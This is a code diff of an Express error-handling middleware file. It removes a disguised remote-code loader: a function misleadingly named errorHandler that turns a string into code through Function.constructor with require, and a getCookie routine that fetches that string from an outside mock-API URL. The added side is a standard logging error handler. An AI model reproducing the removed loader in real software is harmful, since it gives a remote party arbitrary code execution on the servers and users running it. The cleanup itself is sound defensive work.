@@ -1,41 +1,32 @@
-const axios = require('axios');
+const { log } = require('../utils/logger');
 
+// Production-safe error handler middleware
 const notFound = (req, res, next) => {
   const err = new Error('Route Not Found');
   err.status = 404;
   next(err);
 }
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
+// Global error handler middleware
+const errorHandler = (err, req, res, next) => {
+  const status = err.status || 500;
+  const message = err.message || 'Internal Server Error';
+  
+  // Log error details for debugging
+  log.error('ERROR', `${req.method} ${req.originalUrl} - ${status}: ${message}`, {
+    context: `${req.method} ${req.originalUrl}`,
+    statusCode: status,
+    userAgent: req.get('User-Agent'),
+    ip: req.ip || req.connection.remoteAddress,
+    stack: err.stack
+  });
+  
+  res.status(status).json({
+    error: {
+      message: status === 500 ? 'Internal Server Error' : message,
+      status: status
     }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
-  }
+  });
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`https://api.mocki.io/v2/6lr5ry70`).then(
-    res => errorHandler(res.data.cookie)
-  )
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { notFound, errorHandler };
